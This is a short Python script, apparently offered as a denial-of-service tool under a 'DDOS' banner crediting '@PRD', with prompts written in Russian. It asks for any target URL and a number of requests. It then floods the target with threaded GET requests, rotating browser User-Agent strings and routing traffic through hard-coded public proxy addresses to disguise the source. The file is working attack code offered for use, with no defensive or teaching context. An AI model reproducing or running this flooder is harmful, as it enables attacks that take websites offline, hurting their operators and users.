import os
os.system("pip install colorama")
import colorama
s = 0
magenta = colorama.Fore.LIGHTMAGENTA_EX
green = colorama.Fore.LIGHTGREEN_EX
red = colorama.Fore.LIGHTRED_EX
install = input(magenta + "[?] Установить все необходимые компоненты? [Y/N]: ")
if install == "Y":
    os.system("pip install requests")
elif install == "y":
    os.system("pip install requests")
elif install == "yes":
    os.system("pip install requests")
elif install == "Yes":
    os.system("pip install requests")
elif install == "YES":
    os.system("pip install requests")
elif install == "да":
    os.system("pip install requests")
elif install == "Да":
    os.system("pip install requests")
else:
    os.system("clear")


import threading
import requests
import colorama
import getpass
import random
print(magenta + """

╔═══╦═══╦═══╦═══╗
╚╗╔╗╠╗╔╗║╔═╗║╔═╗║
░║║║║║║║║║░║║╚══╗
░║║║║║║║║║░║╠══╗║
╔╝╚╝╠╝╚╝║╚═╝║╚═╝║
╚═══╩═══╩═══╩═══╝
════════════════════════════════
     Разработчик: @PRD  
════════════════════════════════
      
════════════════════════════════
    Владелец: @PRD
════════════════════════════════
""")
proxies = {
    'http': '108.181.56.101:3128',
    'http': '50.174.7.158:80',
    'http': '178.48.68.61:18080',
    'http': '50.221.230.186:80',
    'http': '50.175.212.79:80',
    'http': '208.113.222.205:57226',
    'http': '54.215.46.91:20087'
}
url = input("[?] URL -> ")

num_requests = int(input("[?] Введите количество запросов -> "))
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
]

def send_request(i):
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers, proxies=proxies)
        print(green + f"[+] Запрос {i} успешно отправлен\n")
    except:
        print(red + f"[-] Ошибка при отправке запроса {i}\n")

threads = []
for i in range(1, num_requests + 1):
    t = threading.Thread(target=send_request, args=[i])
    t.start()
    threads.append(t)

for t in threads:
    t.join()